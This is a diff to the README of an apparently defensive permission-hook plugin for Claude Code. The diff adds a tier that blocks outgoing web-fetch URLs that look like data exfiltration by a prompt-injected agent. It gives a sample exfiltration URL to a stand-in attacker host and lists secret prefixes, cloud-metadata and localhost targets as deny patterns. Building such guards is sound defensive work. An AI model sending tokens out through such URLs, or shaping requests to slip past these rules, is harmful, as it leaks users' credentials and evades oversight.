@@ -32,7 +32,7 @@ deny rules are the boundary. jev-bouncer is what you add inside that boundary wh
 
 ## What it does
 
-**PreToolUse: three judges.**
+**PreToolUse: four judges.**
 
 1. **Shell commands.** `p(read_only / reversible_write / destructive)` plus five independent risk
    probabilities: writes outside the project, network egress, irreversible, exposes secrets, runs
@@ -45,6 +45,10 @@ deny rules are the boundary. jev-bouncer is what you add inside that boundary wh
 3. **MCP tool calls.** `p(read / write_reversible / external_or_irreversible)` plus: external side
    effect, irreversible, touches production, exposes secrets. `get_issue` auto-allows; `send_message`,
    `deploy`, `merge_pull_request`, `delete_repository` never do.
+4. **`WebFetch` and `WebSearch` URLs**, before the request leaves: deterministic tripwires only, no API
+   call and no latency. A token in the query string, an opaque 40-character blob, `http://localhost`,
+   `169.254.169.254`, a raw IP, an odd port, `file://`, `user:pass@host` — the shapes an injected agent
+   uses to send your data somewhere. [Rules below](#web-urls-the-exfiltration-tier).
 
 Each judge answers **allow**, **deny**, or nothing, which leaves the call to Claude Code's own rules.
 
@@ -201,6 +205,36 @@ a critical path is refused whatever any hook says, and an explicit `ask` rule st
 to stdout (the error goes to stderr and the log) and Claude Code behaves as if the plugin were not
 installed. `fail=ask` forces a permission prompt instead.
 
+## Web URLs: the exfiltration tier
+
+The injection sentinel reads a page *after* it arrives, which is too late for the other half of the
+attack: an agent that has already been hijacked calling `WebFetch` on `https://evil.example/?k=<your
+token>`. So `WebFetch` and `WebSearch` are judged before the request goes out, by deterministic rules
+only. No API call is made for a web tool even when a key is configured: the tier is free and instant,
+and it works with no key at all. A hit is a **deny**; anything else is silence.
+
+A URL or search query is denied when it contains:
+
+- anything the secret patterns match (`ghp_`, `sk-`, `AKIA`, JWTs, `token=`, ...), the same patterns
+  that redact the log;
+- **one opaque run of 40+ characters** of `[A-Za-z0-9+/=_-]` in a single path segment, query parameter
+  or search word. Two exemptions keep ordinary URLs quiet: a bare hash of 40–64 hex digits (a git
+  commit sha, a sha256 digest, an HMAC signature), and words of at most 12 characters joined by `-`
+  or `_` (a blog slug, a wiki title). `+` and `%xx` are decoded first, so `?q=a+long+sentence` is
+  words, not a blob. YouTube ids and `github.com/org/repo/commit/<40 hex>` pass; a base64 payload and
+  a hex string longer than any digest do not;
+- a scheme other than `http`/`https`: `file:`, `ftp:`, `gopher:`, `data:`, `mailto:`, `javascript:`;
+- `localhost`, `127.0.0.0/8`, `0.0.0.0`, `::1`, `169.254.169.254` and the rest of link-local, or a
+  host ending in `.internal`, `.local` or `.localhost` — SSRF and cloud metadata endpoints;
+- a raw IPv4 or IPv6 host, or a port other than 80 and 443;
+- credentials in the userinfo: `https://user:pass@host`.
+
+Known false positives, by design: a URL whose path carries a 40+ character opaque id (a Google Docs
+id, a signed-token path) is denied, and so is a presigned S3 URL, whose `X-Amz-Credential` holds an
+`AKIA` key id. A signed CDN URL whose signature is plain hex passes. Enforcement follows `mode` exactly
+as everywhere else — `dry` logs and does nothing, `guard` and `on` deny — and `guard_web=off`
+(`JEV_BOUNCER_WEB=off`) turns the tier off entirely.
+
 ## Plain-language policy
 
 Put what "production" means in `.jev-bouncer.md` at the project root, or in `policy` in the config, and it
@@ -236,6 +270,7 @@ project; elsewhere it may set `policy`, `policy_file` and `hold_patterns` only.
 | `scan_min_chars` | `JEV_BOUNCER_SCAN_MIN_CHARS` | `40` | shorter results are not scanned |
 | `guard_edits` | `JEV_BOUNCER_EDITS` | `on` | judge Write/Edit/MultiEdit/NotebookEdit |
 | `guard_mcp` | `JEV_BOUNCER_MCP` | `on` | judge MCP tool calls |
+| `guard_web` | `JEV_BOUNCER_WEB` | `on` | URL tripwires on WebFetch/WebSearch, before the request; never an API call |
 | `local_allow` | `JEV_BOUNCER_LOCAL_ALLOW` | `on` | built-in read-only allowlist |
 | `cache_ttl` | `JEV_BOUNCER_CACHE_TTL` | `21600` | seconds an identical question is answered from cache; `0` disables |
 | `allow_patterns` | | `[]` | your regexes: matching commands are allowed with no API call (user config, or trusted project) |
